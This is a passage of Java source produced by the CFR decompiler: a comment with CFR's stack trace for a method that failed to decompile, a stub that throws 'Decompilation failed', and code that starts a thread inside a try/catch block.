                         * This method has failed to decompile.  When submitting a bug report, please provide this stack trace, and (if you hold appropriate legal rights) the relevant class file.
                         * 
                         * org.benf.cfr.reader.util.ConfusedCFRException: Tried to end blocks [3[TRYBLOCK]], but top level block is 8[SWITCH]
                         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.processEndingBlocks(Op04StructuredStatement.java:435)
                         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.buildNestedBlocks(Op04StructuredStatement.java:484)
                         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op03SimpleStatement.createInitialStructuredBlock(Op03SimpleStatement.java:736)
                         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisInner(CodeAnalyser.java:850)
                         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisOrWrapFail(CodeAnalyser.java:278)
                         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysis(CodeAnalyser.java:201)
                         *     at org.benf.cfr.reader.entities.attributes.AttributeCode.analyse(AttributeCode.java:94)
                         *     at org.benf.cfr.reader.entities.Method.analyse(Method.java:531)
                         *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1055)
                         *     at org.benf.cfr.reader.entities.ClassFile.analyseInnerClassesPass1(ClassFile.java:923)
                         *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1035)
                         *     at org.benf.cfr.reader.entities.ClassFile.analyseInnerClassesPass1(ClassFile.java:923)
                         *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1035)
                         *     at org.benf.cfr.reader.entities.ClassFile.analyseTop(ClassFile.java:942)
                         *     at org.benf.cfr.reader.Driver.doJarVersionTypes(Driver.java:257)
                         *     at org.benf.cfr.reader.Driver.doJar(Driver.java:139)
                         *     at org.benf.cfr.reader.CfrDriverImpl.analyse(CfrDriverImpl.java:76)
                         *     at org.benf.cfr.reader.Main.main(Main.java:54)
                         */
                        throw new IllegalStateException("Decompilation failed");
                    }
                };
                Thread thread = new Thread(runnable2);
                thread.start();
            }
            catch (Exception exception) {
                exception.printStackTrace();
            }
        }
    }
}

